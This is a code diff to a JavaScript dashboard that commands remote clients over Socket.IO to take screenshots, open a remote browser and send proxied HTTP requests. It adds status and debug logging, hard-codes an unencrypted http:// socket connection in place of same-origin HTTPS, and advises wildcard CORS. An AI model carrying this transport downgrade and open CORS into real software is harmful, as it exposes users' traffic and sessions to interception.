@@ -13,6 +13,20 @@ var info = {
 // Şifre koruması kontrolü - Sadece şifre doğru girildiyse bağlan
 var socket = null;
 
+// Connection status güncelleme fonksiyonu
+function updateConnectionStatus(connected, message) {
+  const statusEl = document.getElementById("connectionStatus");
+  if (!statusEl) return;
+  
+  if (connected) {
+    statusEl.className = "badge bg-success";
+    statusEl.textContent = "✅ " + (message || "Bağlandı");
+  } else {
+    statusEl.className = "badge bg-danger";
+    statusEl.textContent = "❌ " + (message || "Bağlantı yok");
+  }
+}
+
 function initializeSocket() {
   // Eğer zaten bağlanmışsa tekrar bağlanma
   if (socket && socket.connected) {
@@ -21,14 +35,10 @@ function initializeSocket() {
   
   /**
    * IMPORTANT:
-   * - Eğer dashboard HTTPS üzerinden yüklendiyse, Socket.IO bağlantısı da HTTPS (wss) üzerinden olmalı.
-   * - Aynı domain üzerinden çalışırken (umaigames.com), origin'i otomatik kullanmak en güvenli yol.
-   * - Farklı bir host'a bağlanmak istenirse, o zaman info.host/info.port kullanılır.
+   * - Electron app gibi açıkça HTTP kullanıyoruz (http://umaigames.com:80)
+   * - Reverse proxy (Nginx/Apache) SSL termination yapıyorsa, Node.js server'a HTTP üzerinden bağlanır
+   * - Mixed Content hatası olmaması için reverse proxy'nin doğru yapılandırılması gerekir
    */
-
-  var currentProtocol = window.location.protocol === "https:" ? "https" : "http";
-  var currentHost = window.location.hostname;
-  var sameHost = (info.host === currentHost); // ör: her ikisi de "umaigames.com"
 
   var socketOptions = {
     forceNew: true,
@@ -40,20 +50,13 @@ function initializeSocket() {
     timeout: 20000,
   };
 
-  var socketUrl;
-
-  if (sameHost) {
-    // Dashboard ile aynı host'tan çalışıyoruz → origin'i kullan (Mixed Content yok)
-    socketUrl = window.location.origin;
-    console.log("🔌 Socket bağlantısı (same-origin) deneniyor:", socketUrl);
-    socket = io.connect(socketOptions); // URL vermeden, mevcut origin'i kullan
-  } else {
-    // Farklı bir host'a bağlanmak isteniyor → protokolü currentProtocol'e göre seç
-    var portPart = info.port ? ":" + info.port : "";
-    socketUrl = currentProtocol + "://" + info.host + portPart;
-    console.log("🔌 Socket bağlantısı (cross-origin) deneniyor:", socketUrl);
-    socket = io.connect(socketUrl, socketOptions);
-  }
+  // Electron app gibi açıkça HTTP kullan (reverse proxy SSL termination yapıyor olabilir)
+  var portPart = info.port ? ":" + info.port : "";
+  var socketUrl = "http://" + info.host + portPart;
+  
+  console.log("🔌 Socket bağlantısı deneniyor:", socketUrl);
+  updateConnectionStatus(false, "Bağlanıyor...");
+  socket = io.connect(socketUrl, socketOptions);
   
   setupSocketEvents();
 }
@@ -61,14 +64,8 @@ function initializeSocket() {
 function setupSocketEvents() {
   if (!socket) return;
  
-  // Loglama için URL bilgisi (same-origin ise window.location.origin)
-  var socketUrl =
-    info.host === window.location.hostname
-      ? window.location.origin
-      : (window.location.protocol === "https:" ? "https" : "http") +
-        "://" +
-        info.host +
-        (info.port ? ":" + info.port : "");
+  // Loglama için URL bilgisi (Electron app gibi HTTP kullanıyoruz)
+  var socketUrl = "http://" + info.host + (info.port ? ":" + info.port : "");
 
   // Bağlantı başarılı
   socket.on("connect", function() {
@@ -78,6 +75,9 @@ function setupSocketEvents() {
     console.log("🌐 Sunucu:", socketUrl);
     console.log("📋 Dashboard ID:", info.dashboardId);
     console.log("=".repeat(50));
+    
+    // Connection status güncelle
+    updateConnectionStatus(true, "Bağlandı");
   });
 
   // Bağlantı hatalarını yakala
@@ -86,9 +86,12 @@ function setupSocketEvents() {
     console.error("Sunucuya bağlanılamıyor:", socketUrl);
     console.error("Hata detayı:", error);
     
+    var errorMsg = "Bağlantı hatası";
+    
     if (error.message.includes("Bad request")) {
       console.error("💡 'Bad request' hatası genellikle Socket.IO versiyon uyumsuzluğu veya transport sorunudur.");
       console.error("💡 Sunucunun Socket.IO v4 kullandığından emin olun.");
+      errorMsg = "Bad request - Versiyon uyumsuzluğu";
     } else if (error.message.includes("timeout") || error.message.includes("xhr poll error")) {
       console.error("💡 Bağlantı zaman aşımı - Sunucu çalışmıyor olabilir veya port kapalı.");
       console.error("💡 Kontrol edin:");
@@ -101,26 +104,33 @@ function setupSocketEvents() {
         console.error("   6. CORS ayarları doğru mu? (Sunucuda origin: '*' olmalı)");
         console.error("   7. Tarayıcı console'da CORS hatası var mı?");
       }
+      errorMsg = "Zaman aşımı - Sunucu erişilemiyor";
     } else if (error.message.includes("CORS")) {
       console.error("💡 CORS hatası - Sunucuda CORS ayarlarını kontrol edin.");
       console.error("💡 Sunucuda cors: { origin: '*' } olmalı.");
+      errorMsg = "CORS hatası";
     }
     
     // Mixed content (HTTP->HTTPS) hatası kontrolü
-    if (error.message.includes("Mixed Content") || 
-        (error.message.includes("https://") && socketUrl.includes("http://"))) {
+    var isMixedContent = error.message.includes("Mixed Content") || 
+        (window.location.protocol === "https:" && socketUrl.includes("http://"));
+    
+    if (isMixedContent) {
       console.error("💡 MIXED CONTENT HATASI TESPİT EDİLDİ!");
-      console.error("💡 Tarayıcı HTTP'den HTTPS'e yönlendiriyor.");
+      console.error("💡 HTTPS sayfadan HTTP Socket.IO'ya bağlanılamıyor.");
       console.error("💡 Çözüm:");
-      console.error("   1. umaigames.com sunucusunda HTTP->HTTPS yönlendirmesini kontrol edin");
-      console.error("   2. HSTS (HTTP Strict Transport Security) header'ını kontrol edin");
-      console.error("   3. Sunucu yapılandırmasında port için HTTP'ye izin verin");
-      console.error("   4. Veya HTTPS üzerinden çalışacak şekilde sunucuyu yapılandırın");
+      console.error("   1. Reverse proxy (Nginx/Apache) WSS (WebSocket Secure) desteği ekleyin");
+      console.error("   2. Socket.IO sunucusunu HTTPS üzerinden erişilebilir yapın");
+      console.error("   3. Veya dashboard'ı HTTP üzerinden yükleyin");
+      errorMsg = "Mixed Content - HTTPS/HTTP uyumsuzluğu";
     }
+    
+    updateConnectionStatus(false, errorMsg);
   });
 
   socket.on("connect_timeout", function() {
     console.error("⏱️ Socket bağlantı zaman aşımı");
+    updateConnectionStatus(false, "Bağlantı zaman aşımı");
   });
   
   // Socket event'leri - connect event
@@ -131,6 +141,7 @@ function setupSocketEvents() {
 
   socket.on("disconnect", function () {
     console.log("Disconnected !");
+    updateConnectionStatus(false, "Bağlantı kesildi");
   });
 
   socket.on("screenshotResponse", function (data) {
@@ -245,7 +256,11 @@ function setupSocketEvents() {
 
   // Remote Browser - Ekran görüntüsü gösterimi
   socket.on("remoteBrowserFrame", function (data) {
-    if (!data.src) return;
+    console.log("📥 [WEB] remoteBrowserFrame received, src length:", data.src ? data.src.length : 0);
+    if (!data.src) {
+      console.error("❌ [WEB] remoteBrowserFrame has no src!");
+      return;
+    }
 
     const img = document.getElementById("remoteBrowserImage");
     const placeholder = document.getElementById("remoteBrowserPlaceholder");
@@ -253,12 +268,19 @@ function setupSocketEvents() {
     if (img) {
       img.src = data.src;
       if (placeholder) placeholder.style.display = "none";
+      console.log("✅ [WEB] remoteBrowserFrame displayed");
+    } else {
+      console.error("❌ [WEB] remoteBrowserImage element not found!");
     }
   });
 
   // HTTP Request Response - Ekran görüntüsü gösterimi
   socket.on("httpResponseFrame", function (data) {
-    if (!data.src) return;
+    console.log("📥 [WEB] httpResponseFrame received, src length:", data.src ? data.src.length : 0, "status:", data.status);
+    if (!data.src) {
+      console.error("❌ [WEB] httpResponseFrame has no src!");
+      return;
+    }
 
     const img = document.getElementById("httpResponseImage");
     const placeholder = document.getElementById("httpResponsePlaceholder");
@@ -266,6 +288,9 @@ function setupSocketEvents() {
     if (img) {
       img.src = data.src;
       if (placeholder) placeholder.style.display = "none";
+      console.log("✅ [WEB] httpResponseFrame displayed");
+    } else {
+      console.error("❌ [WEB] httpResponseImage element not found!");
     }
   });
 
@@ -491,9 +516,15 @@ $(document).on("click", ".runBtn", function () {
  * Remote Browser - Ekran görüntüsü yaklaşımı
  */
 function openRemoteBrowser() {
-  if (!socket || !socket.connected) {
-    console.error("Socket not connected");
-    alert("Socket bağlantısı yok! Lütfen sayfayı yenileyin.");
+  if (!socket) {
+    console.error("❌ [WEB] Socket not initialized");
+    alert("Socket bağlantısı başlatılamadı! Lütfen sayfayı yenileyin.");
+    return;
+  }
+  
+  if (!socket.connected) {
+    console.error("❌ [WEB] Socket not connected. Connection state:", socket.connected, "Socket ID:", socket.id);
+    alert("Socket bağlantısı yok! Lütfen bağlantıyı kontrol edin ve sayfayı yenileyin.\n\nBağlantı durumu: " + (socket.connected ? "Bağlı" : "Bağlı değil"));
     return;
   }
 
@@ -520,6 +551,10 @@ function openRemoteBrowser() {
     url: finalUrl,
   };
 
+  console.log("📤 [WEB] Emitting remoteBrowserOpen:", data);
+  console.log("📤 [WEB] Socket connected:", socket.connected, "Socket ID:", socket.id);
+  console.log("📤 [WEB] Target room:", data.from);
+
   const placeholder = document.getElementById("remoteBrowserPlaceholder");
   if (placeholder) {
     placeholder.style.display = "flex";
@@ -527,14 +562,29 @@ function openRemoteBrowser() {
   }
 
   socket.emit("remoteBrowserOpen", data);
+  
+  // Timeout kontrolü - 10 saniye sonra hala yanıt gelmezse uyar
+  setTimeout(() => {
+    if (placeholder && placeholder.style.display !== "none") {
+      placeholder.innerHTML = '<span class="text-warning">Timeout - Yanıt bekleniyor... Socket bağlantısını kontrol edin.</span>';
+      console.warn("⏱️ [WEB] remoteBrowserOpen timeout - no response after 10 seconds");
+    }
+  }, 10000);
 }
 
 /**
  * HTTP Request - Terminal üzerinden HTTP isteği gönder
  */
 function sendHttpRequest() {
-  if (!socket || !socket.connected) {
-    alert("Socket bağlantısı yok!");
+  if (!socket) {
+    console.error("❌ [WEB] Socket not initialized");
+    alert("Socket bağlantısı başlatılamadı! Lütfen sayfayı yenileyin.");
+    return;
+  }
+  
+  if (!socket.connected) {
+    console.error("❌ [WEB] Socket not connected. Connection state:", socket.connected, "Socket ID:", socket.id);
+    alert("Socket bağlantısı yok! Lütfen bağlantıyı kontrol edin ve sayfayı yenileyin.\n\nBağlantı durumu: " + (socket.connected ? "Bağlı" : "Bağlı değil"));
     return;
   }
 
@@ -590,6 +640,10 @@ function sendHttpRequest() {
     body: body
   };
 
+  console.log("📤 [WEB] Emitting httpRequest:", data.method, data.url);
+  console.log("📤 [WEB] Socket connected:", socket.connected, "Socket ID:", socket.id);
+  console.log("📤 [WEB] Target room:", data.from);
+
   const placeholder = document.getElementById("httpResponsePlaceholder");
   if (placeholder) {
     placeholder.style.display = "flex";
@@ -597,6 +651,14 @@ function sendHttpRequest() {
   }
 
   socket.emit("httpRequest", data);
+  
+  // Timeout kontrolü - 15 saniye sonra hala yanıt gelmezse uyar
+  setTimeout(() => {
+    if (placeholder && placeholder.style.display !== "none") {
+      placeholder.innerHTML = '<span class="text-warning">Timeout - Yanıt bekleniyor... Socket bağlantısını kontrol edin.</span>';
+      console.warn("⏱️ [WEB] httpRequest timeout - no response after 15 seconds");
+    }
+  }, 15000);
 }
 
 
